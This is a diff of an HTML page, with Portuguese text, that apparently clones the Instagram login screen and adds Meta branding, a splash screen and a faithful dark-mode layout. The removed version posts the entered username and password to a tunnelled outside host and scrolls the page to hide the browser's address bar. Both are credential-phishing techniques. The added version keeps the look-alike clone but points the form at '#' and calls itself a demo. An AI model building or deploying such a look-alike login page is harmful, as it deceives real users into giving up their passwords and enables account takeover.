@@ -2,60 +2,427 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Instagram</title>
     <style>
-        /* Força a página a ser maior que a tela para permitir o scroll que esconde a barra */
-        html, body { height: 110%; margin: 0; padding: 0; overflow-x: hidden; background-color: #fff; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; }
-        
-        .container { width: 100%; max-width: 350px; padding: 20px; margin-top: 60px; text-align: center; box-sizing: border-box; }
-        .brand-text { font-size: 36px; font-weight: bold; margin-bottom: 40px; color: #262626; letter-spacing: -1px; font-style: italic; }
-        
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 12px; margin-bottom: 8px; font-size: 16px; /* 16px evita o zoom automático do iPhone */ box-sizing: border-box; }
-        button { width: 100%; background-color: #0095f6; border: none; border-radius: 8px; color: #fff; padding: 10px; font-weight: 600; cursor: pointer; margin-top: 10px; font-size: 14px; }
-        
-        .divider { margin: 25px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
-        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 25px; }
-        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
-        .signup { margin-top: 40px; border: 1px solid #dbdbdb; padding: 20px; width: 100%; box-sizing: border-box; font-size: 14px; }
-        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            -webkit-tap-highlight-color: transparent; 
+        }
+
+        body, html { 
+            height: 100dvh; 
+            background-color: #000; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        /* ========== SPLASH SCREEN ========== */
+        #splash {
+            position: fixed; 
+            inset: 0; 
+            background: #000;
+            display: flex; 
+            flex-direction: column; 
+            align-items: center;
+            justify-content: space-between; 
+            padding: 120px 0 60px 0; 
+            z-index: 1000; 
+            transition: opacity 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .splash-logo-wrapper {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .insta-splash-logo {
+            width: 80px; 
+            height: 80px;
+            filter: drop-shadow(0 0 8px rgba(252, 175, 69, 0.15));
+        }
+
+        .from-meta-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .from-text {
+            color: #8E8E8E;
+            font-size: 13px;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+            text-transform: lowercase;
+        }
+
+        .meta-splash {
+            display: flex;
+            align-items: baseline;
+            gap: 4px;
+        }
+
+        .infinity-splash {
+            font-size: 24px;
+            line-height: 1;
+            font-weight: 600;
+            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .meta-word-splash {
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #FCAF45 0%, #FD1D1D 35%, #E1306C 55%, #C13584 75%, #833AB4 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ========== LOGIN SCREEN ========== */
+        #login-screen {
+            display: none; 
+            flex-direction: column; 
+            align-items: center;
+            width: 100%; 
+            height: 100dvh; 
+            background-color: #000000;
+            padding: 0 16px; 
+            position: relative;
+        }
+
+        /* Idioma no topo - posição exata */
+        .lang-selector-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px 0 8px 0;
+            margin-bottom: 12px;
+        }
+
+        .lang-selector { 
+            color: #A8A8A8; 
+            font-size: 14px;
+            font-weight: 400;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .lang-selector svg {
+            width: 12px;
+            height: 12px;
+            fill: #A8A8A8;
+        }
+
+        /* Logo Instagram no login - posicionamento exato */
+        .insta-logo-login-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 36px;
+        }
+
+        .insta-logo-login { 
+            width: 64px; 
+            height: 64px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.3));
+        }
+
+        /* Formulário */
+        form { 
+            width: 100%; 
+            max-width: 358px;
+        }
+
+        .input-box {
+            width: 100%; 
+            background: #121212; 
+            border: 0.5px solid #363636;
+            border-radius: 12px; 
+            padding: 14px 16px; 
+            color: #FFFFFF;
+            font-size: 14px; 
+            font-weight: 400;
+            margin-bottom: 10px;
+            outline: none;
+            transition: border-color 0.2s ease;
+        }
+
+        .input-box:focus {
+            border-color: #A8A8A8;
+        }
+
+        .input-box::placeholder {
+            color: #8E8E8E;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .btn-login {
+            width: 100%; 
+            background: #0095F6; 
+            color: #FFFFFF;
+            border: none; 
+            border-radius: 18px; 
+            padding: 7px 0;
+            font-size: 14px; 
+            font-weight: 600; 
+            margin-top: 12px;
+            margin-bottom: 16px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            line-height: 18px;
+        }
+
+        .btn-login:hover {
+            background: #1877F2;
+        }
+
+        .btn-login:active {
+            opacity: 0.7;
+        }
+
+        /* Link Esqueceu a senha */
+        .forgot-pass-wrapper {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 80px;
+        }
+
+        .forgot-pass { 
+            color: #FFFFFF; 
+            font-size: 14px; 
+            font-weight: 500;
+            text-decoration: none; 
+        }
+
+        .forgot-pass:active {
+            opacity: 0.7;
+        }
+
+        /* Rodapé - área inferior */
+        .footer-container {
+            margin-top: auto; 
+            width: 100%; 
+            display: flex;
+            flex-direction: column; 
+            align-items: center; 
+            padding-bottom: 24px;
+        }
+
+        /* Linha divisória e link de cadastro */
+        .signup-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px 0 20px 0;
+            position: relative;
+        }
+
+        .signup-wrapper::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -16px;
+            right: -16px;
+            height: 0.5px;
+            background: #262626;
+        }
+
+        .signup-box { 
+            color: #A8A8A8; 
+            font-size: 14px; 
+            font-weight: 400;
+        }
+
+        .signup-box a { 
+            color: #0095F6; 
+            text-decoration: none; 
+            font-weight: 600; 
+        }
+
+        .signup-box a:active {
+            opacity: 0.7;
+        }
+
+        /* Logo Meta no rodapé - estilo oficial: ∞ pequeno, Meta maior */
+        .meta-footer {
+            display: flex;
+            align-items: baseline;
+            justify-content: center;
+            gap: 2px;
+            opacity: 0.6;
+            padding: 8px 0;
+        }
+
+        .infinity-footer {
+            font-size: 18px;
+            line-height: 1;
+            font-weight: 600;
+            color: #FFFFFF;
+            margin-right: 1px;
+        }
+
+        .meta-word-footer {
+            font-size: 14px;
+            font-weight: 600;
+            color: #FFFFFF;
+            letter-spacing: -0.2px;
+        }
+
+        /* Ajustes para mobile */
+        @media (max-width: 380px) {
+            .insta-logo-login {
+                width: 60px;
+                height: 60px;
+            }
+            .insta-logo-login-wrapper {
+                margin-bottom: 28px;
+            }
+            .forgot-pass-wrapper {
+                margin-bottom: 60px;
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="brand-text">Instagram</div>
-        
-        <form action="https://693ef71330a356b2-45-161-216-55.serveousercontent.com" method="POST">
-            <input type="text" name="username" placeholder="Telefone, nome de usuário ou email" required onfocus="hideBar()">
-            <input type="password" name="password" placeholder="Senha" required onfocus="hideBar()">
-            <button type="submit">Entrar</button>
-        </form>
 
-        <div class="divider">OU</div>
-        <a href="#" class="fb-login">Entrar com o Facebook</a>
-        <a href="#" class="forgot">Esqueceu a senha?</a>
+    <!-- Gradientes SVG -->
+    <svg style="width:0; height:0; position:absolute;">
+        <defs>
+            <!-- Gradiente principal do Instagram - cores oficiais e vibrantes -->
+            <linearGradient id="instaGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" stop-color="#833AB4"/>
+                <stop offset="25%" stop-color="#C13584"/>
+                <stop offset="50%" stop-color="#E1306C"/>
+                <stop offset="75%" stop-color="#FD1D1D"/>
+                <stop offset="100%" stop-color="#FCAF45"/>
+            </linearGradient>
+            
+            <!-- Gradiente horizontal alternativo -->
+            <linearGradient id="instaGradientHoriz" x1="0%" y1="0%" x2="100%" y2="0%">
+                <stop offset="0%" stop-color="#FCAF45"/>
+                <stop offset="25%" stop-color="#FD1D1D"/>
+                <stop offset="50%" stop-color="#E1306C"/>
+                <stop offset="75%" stop-color="#C13584"/>
+                <stop offset="100%" stop-color="#833AB4"/>
+            </linearGradient>
+        </defs>
+    </svg>
+
+    <!-- ========== SPLASH SCREEN ========== -->
+    <div id="splash">
+        <div class="splash-logo-wrapper">
+            <svg class="insta-splash-logo" viewBox="0 0 24 24" fill="none">
+                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
+                <circle cx="12" cy="12" r="5.5" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
+                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instaGradient)"/>
+            </svg>
+        </div>
+
+        <div class="from-meta-container">
+            <p class="from-text">from</p>
+            <div class="meta-splash">
+                <span class="infinity-splash">∞</span>
+                <span class="meta-word-splash">Meta</span>
+            </div>
+        </div>
     </div>
 
-    <div class="container" style="margin-top: 10px;">
-        <div class="signup">
-            Não tem uma conta? <a href="#">Cadastre-se</a>
+    <!-- ========== LOGIN SCREEN ========== -->
+    <div id="login-screen">
+        <!-- Seletor de idioma -->
+        <div class="lang-selector-wrapper">
+            <div class="lang-selector">
+                <span>Português (Brasil)</span>
+                <svg viewBox="0 0 24 24">
+                    <path d="M7 10l5 5 5-5H7z"/>
+                </svg>
+            </div>
+        </div>
+        
+        <!-- Logo Instagram -->
+        <div class="insta-logo-login-wrapper">
+            <svg class="insta-logo-login" viewBox="0 0 24 24" fill="none">
+                <rect x="1.5" y="1.5" width="21" height="21" rx="6" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
+                <circle cx="12" cy="12" r="5.5" stroke="url(#instaGradient)" stroke-width="2.2" fill="none"/>
+                <circle cx="17.8" cy="6.2" r="1.8" fill="url(#instaGradient)"/>
+            </svg>
+        </div>
+
+        <!-- Formulário de login -->
+        <form action="#" method="POST">
+            <input type="text" name="username" class="input-box" placeholder="Nome de usuário, email ou celular" required>
+            <input type="password" name="password" class="input-box" placeholder="Senha" required>
+            <button type="submit" class="btn-login">Entrar</button>
+        </form>
+
+        <!-- Esqueceu a senha -->
+        <div class="forgot-pass-wrapper">
+            <a href="#" class="forgot-pass">Esqueceu a senha?</a>
+        </div>
+
+        <!-- Rodapé com cadastro e Meta -->
+        <div class="footer-container">
+            <div class="signup-wrapper">
+                <div class="signup-box">
+                    Não tem uma conta? <a href="#">Cadastre-se</a>
+                </div>
+            </div>
+            
+            <!-- Meta logo: ∞ pequeno, Meta maior (estilo oficial) -->
+            <div class="meta-footer">
+                <span class="infinity-footer">∞</span>
+                <span class="meta-word-footer">Meta</span>
+            </div>
         </div>
     </div>
 
     <script>
-        // Tenta esconder a barra ao interagir
-        function hideBar() {
-            window.scrollTo(0, 1);
-        }
-        // Tenta esconder no load inicial
-        window.addEventListener("load", function() {
-            setTimeout(function() {
-                window.scrollTo(0, 1);
-            }, 1000);
-        });
+        (function() {
+            'use strict';
+            
+            // Garantir que o form não submeta para lugar nenhum na demo
+            const form = document.querySelector('form');
+            if (form) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                });
+            }
+            
+            // Links não navegam
+            document.querySelectorAll('a').forEach(link => {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                });
+            });
+            
+            // Splash screen timing
+            window.addEventListener('load', function() {
+                const splash = document.getElementById('splash');
+                const login = document.getElementById('login-screen');
+                
+                setTimeout(function() {
+                    splash.style.opacity = '0';
+                    
+                    setTimeout(function() {
+                        splash.style.display = 'none';
+                        login.style.display = 'flex';
+                    }, 350);
+                }, 2200);
+            });
+        })();
     </script>
 </body>
 </html>
